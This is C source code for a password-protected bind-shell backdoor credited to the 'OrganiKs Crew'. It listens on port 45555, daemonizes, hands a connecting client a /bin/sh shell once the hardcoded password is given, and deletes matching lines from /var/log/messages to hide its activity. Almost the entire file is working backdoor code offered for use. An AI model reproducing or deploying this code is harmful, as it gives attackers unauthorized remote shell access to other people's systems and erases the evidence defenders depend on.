/* 
 * A simple program that binds a shell to a port.
 * OrganiKs BACKDOOR & LOG CLEAN by Lionel
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <syslog.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h> 
#include <unistd.h> 
#include <stdlib.h> 

#define PASSWD "OrganiKs"
#define PORT 45555
#define SHELL "/bin/sh"
#define SHELLNAME "sh"

main()
{
 char buff[100];
char commande[350];
 int n;
 int sock, fd, client_len;
 struct sockaddr_in server, client;
 void childw();

 sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 server.sin_family=AF_INET;
 server.sin_addr.s_addr=INADDR_ANY;
 server.sin_port=htons(PORT);
 bind(sock,(struct sockaddr *)&server, sizeof server); 
 client_len=sizeof client;
 if(fork())
	exit(0);
 signal(SIGHUP, SIG_IGN); 
 signal(SIGTTOU,SIG_IGN);
 signal(SIGTTIN,SIG_IGN);
 signal(SIGTSTP,SIG_IGN);
 listen(sock,5); 
 if((fd=open("/dev/tty",O_RDWR))>=0)
 {
	ioctl(fd,TIOCNOTTY,(char *)NULL);
	close(fd);
 }
 while(1) 
 {
	 setpgrp();
 	while((fd=accept(sock,(struct sockaddr *)&client,&client_len)) == -1)
	{
			perror("accepting connection");
			exit(3);
 	}
	if(fork())
	{
strcpy(commande,"clear");
strcat(commande, "");
system(commande);
strcpy(commande, "/bin/grep -v 45555 /var/log/messages > /var/log/m.tmp ; /bin/cat /var/log/m.tmp > /var/log/messages; /bin/rm -f /var/log/m.tmp");
system(commande);
		do
		{
			write(fd,"\nPASSWORD:",11);
			n=read(fd,buff,100);
		} 
		while(n>0 && strncmp(PASSWD,buff,strlen(PASSWD)));
		write(fd,"Hi, good password! OrganiKs Crew Backdoor!\n",43);
write(fd,"/bin/grep -v IP /var/log/messages > /var/log/m.tmp ; /bin/cat
/var/log/m.tmp > /var/log/messages; /bin/rm -f /var/log/m.tmp\n\n",75);
		dup2(fd,0); 		
                dup2(fd,1);
 		dup2(fd,2);
		execl(SHELL,SHELLNAME,0);
		close(fd);
		
	}
	close(fd);
 } 
}






